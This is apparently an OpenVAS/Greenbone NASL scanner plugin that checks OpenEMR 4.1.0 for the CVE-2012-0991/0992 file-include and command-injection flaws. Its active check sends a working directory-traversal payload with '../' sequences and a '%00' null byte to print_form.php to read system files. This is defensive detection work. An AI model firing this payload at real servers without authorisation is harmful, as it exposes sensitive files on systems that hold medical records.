if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103410" );
	script_bugtraq_id( 51788 );
	script_cve_id( "CVE-2012-0991", "CVE-2012-0992" );
	script_tag( name: "cvss_base", value: "8.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:S/C:C/I:C/A:C" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "OpenEMR Local File Include and Command Injection Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/51788" );
	script_xref( name: "URL", value: "http://www.open-emr.org/" );
	script_xref( name: "URL", value: "http://www.open-emr.org/wiki/index.php/OpenEMR_Patches" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/521448" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-02-02 12:55:39 +0100 (Thu, 02 Feb 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_openemr_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "openemr/installed" );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more information." );
	script_tag( name: "summary", value: "OpenEMR is prone to local file-include and command-injection
vulnerabilities because it fails to properly sanitize user-
supplied input." );
	script_tag( name: "impact", value: "A remote attacker can exploit these issues to execute arbitrary shell
commands with the privileges of the user running the application,
obtain potentially sensitive information, and execute arbitrary local
scripts in the context of the Web server process. This could allow the
attacker to compromise the application and the computer - other attacks
are also possible." );
	script_tag( name: "affected", value: "OpenEMR 4.1.0 is vulnerable - other versions may also be affected." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
CPE = "cpe:/a:open-emr:openemr";
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = NASLString( dir, "/contrib/acog/print_form.php?formname=", crap( data: "../", length: 6 * 9 ), files[file], "%00" );
	if(http_vuln_check( port: port, url: url, pattern: file )){
		security_message( port: port );
	}
}
exit( 0 );

